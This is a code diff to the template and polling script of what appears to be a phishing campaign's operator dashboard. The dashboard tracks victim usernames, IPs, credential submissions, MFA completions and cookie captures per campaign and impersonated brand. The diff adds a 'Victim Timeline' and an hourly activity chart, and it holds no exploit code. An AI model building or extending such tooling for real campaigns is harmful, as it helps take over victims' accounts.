@@ -214,6 +214,19 @@
   .seg-mfa_complete      { background: var(--blue); }
   .seg-cookie_capture    { background: var(--purple); }
 
+  /* Time bar (hourly histogram) */
+  .time-bar {
+    display: flex;
+    height: 18px;
+    border-radius: 4px;
+    overflow: hidden;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    min-width: 80px;
+    gap: 1px;
+  }
+  .time-bar .seg { transition: flex 0.3s ease; }
+
   /* Progress bar (rate column) */
   .rate-bar {
     display: flex;
@@ -400,6 +413,33 @@
 {{end}}
 
 <div class="section-header">
+  <h2>Activity by Hour</h2>
+  <span class="count">{{len .Buckets}} windows</span>
+</div>
+{{if .Buckets}}
+<div class="table-wrap">
+<table>
+  <thead><tr><th>Window (UTC)</th><th>Total</th><th>Activity</th></tr></thead>
+  <tbody>
+  {{range .Buckets}}
+    <tr>
+      <td class="mono">{{.Window}}</td>
+      <td>{{.Total}}</td>
+      <td>
+        <div class="time-bar">
+          {{if gt .PageLoads 0}}<div class="seg seg-page_loads" style="flex: {{.PageLoads}}"></div>{{end}}
+          {{if gt .CredSubs 0}}<div class="seg seg-credential_submit" style="flex: {{.CredSubs}}"></div>{{end}}
+          {{if gt .MfaComps 0}}<div class="seg seg-mfa_complete" style="flex: {{.MfaComps}}"></div>{{end}}
+        </div>
+      </td>
+    </tr>
+  {{end}}
+  </tbody>
+</table>
+</div>
+{{else}}<p class="empty">No activity data yet.</p>{{end}}
+
+<div class="section-header">
   <h2>Top Victim IPs</h2>
   <span class="count">{{len .TopIPs}} IPs</span>
 </div>
@@ -425,36 +465,58 @@
 {{end}}
 
 <div class="section-header">
-  <h2>Recent Activity</h2>
-  <span class="count" id="poll-status">live</span>
+  <h2>Victim Timeline</h2>
+  <span class="count">{{len .Timeline}} victims</span>
 </div>
-<div id="recent-feed">
-{{if .Recent}}
-{{range .Recent}}
-  <div class="feed-item">
-    <span class="ts">{{.Timestamp}}</span>
-    <span class="badge badge-{{.EventType}}">{{.EventType}}</span>
-    <span class="campaign mono">{{if .CampaignID}}{{.CampaignID}}{{else}}&mdash;{{end}}</span>
-    <span>{{.Brand}}</span>
-    <span class="mono" style="color:var(--text-dim);font-size:0.7rem">{{.IP}}</span>
-    <span class="victim">{{if .Username}}{{.Username}}{{else}}&mdash;{{end}}</span>
-  </div>
-{{end}}
+{{if .Timeline}}
+<div class="table-wrap">
+<table>
+  <thead>
+    <tr>
+      <th>Username</th>
+      <th>Campaign</th>
+      <th>Brand</th>
+      <th>IP</th>
+      <th>Status</th>
+      <th>First Seen</th>
+      <th>Last Seen</th>
+    </tr>
+  </thead>
+  <tbody>
+  {{range .Timeline}}
+    <tr>
+      <td class="victim-name">{{.Username}}</td>
+      <td class="mono">{{if .CampaignID}}{{.CampaignID}}{{else}}&mdash;{{end}}</td>
+      <td>{{.Brand}}</td>
+      <td class="mono" style="font-size:0.7rem;color:var(--text-dim);">{{.IP}}</td>
+      <td>
+        {{if .HasMFA}}
+          <span class="badge badge-mfa_complete">MFA Complete</span>
+        {{else if .HasCreds}}
+          <span class="badge badge-credential_submit">Creds Only</span>
+        {{else}}
+          <span class="badge badge-page_load">Page Load</span>
+        {{end}}
+      </td>
+      <td class="mono" style="font-size:0.7rem;">{{.FirstSeen}}</td>
+      <td class="mono" style="font-size:0.7rem;">{{.LastSeen}}</td>
+    </tr>
+  {{end}}
+  </tbody>
+</table>
+</div>
 {{else}}
-<p class="empty">No events yet — waiting for campaign activity.</p>
+<p class="empty">No victim data yet — waiting for campaign activity.</p>
 {{end}}
-</div>
 
 <div class="footer">
-  <span>Generated {{.GeneratedAt}}</span>
-  <span>Live polling every 10s</span>
+  <span id="footer-info">Generated {{.GeneratedAt}}</span>
+  <span>Live polling every 10s · <span id="poll-status">live</span></span>
 </div>
 
 <script>
 (function(){
-  var since = new Date().toISOString();
   var statusEl = document.getElementById('poll-status');
-  var feedEl = document.getElementById('recent-feed');
   var dotEl = document.getElementById('live-dot');
 
   function poll() {
@@ -468,8 +530,9 @@
       .then(function(data) {
         statusEl.textContent = 'live';
         statusEl.style.color = 'var(--green)';
-        if (!data || !data.Recent || data.Recent.length === 0) return;
-
+        dotEl.classList.remove('off');
+        if (!data) return;
+        // Update summary cards
         var sc = document.getElementById('summary-cards');
         if (sc && data.Total !== undefined) {
           sc.innerHTML =
@@ -478,27 +541,10 @@
             '<div class="card ips"><div class="label">Unique IPs</div><div class="value">' + (data.UniqueIPs || 0) + '</div></div>' +
             '<div class="card campaigns"><div class="label">Active Campaigns</div><div class="value">' + (data.ActiveCampaigns || 0) + '</div></div>';
         }
-
-        var recents = data.Recent || [];
-        for (var i = recents.length - 1; i >= 0; i--) {
-          var ev = recents[i];
-          var div = document.createElement('div');
-          div.className = 'feed-item';
-          div.innerHTML =
-            '<span class="ts">' + esc(ev.timestamp) + '</span>' +
-            '<span class="badge badge-' + esc(ev.event_type) + '">' + esc(ev.event_type) + '</span>' +
-            '<span class="campaign mono">' + esc(ev.campaign_id || '—') + '</span>' +
-            '<span>' + esc(ev.brand) + '</span>' +
-            '<span class="mono" style="color:var(--text-dim);font-size:0.7rem">' + esc(ev.ip) + '</span>' +
-            '<span class="victim">' + esc(ev.username || '—') + '</span>';
-          feedEl.insertBefore(div, feedEl.firstChild);
-        }
-        while (feedEl.children.length > 50) { feedEl.removeChild(feedEl.lastChild); }
-        if (recents.length > 0) { since = recents[recents.length - 1].timestamp; }
-
+        // Update footer
         var footer = document.getElementById('footer-info');
         if (footer && data.GeneratedAt) {
-          footer.innerHTML = '<span>Generated ' + esc(data.GeneratedAt) + '</span><span>Live polling every 10s</span>';
+          footer.textContent = 'Generated ' + esc(data.GeneratedAt);
         }
       })
       .catch(function(err) {
